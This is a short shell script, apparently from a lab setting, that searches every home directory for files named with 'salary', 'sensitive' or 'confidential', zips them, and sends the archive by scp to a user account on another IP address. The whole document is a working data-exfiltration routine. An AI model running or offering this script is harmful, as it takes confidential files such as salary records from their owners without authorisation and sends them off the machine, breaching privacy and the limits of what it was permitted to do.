file=$( find /home/  \( -name "*salary*" -o -name "*sensitive*" -o -name "*confidential*" \) ! -path "/home/lab301/Desktop/*")
zip -r sensitive.zip $file
scp sensitive.zip basanta@172.22.168.180:/home/basanta/Desktop/
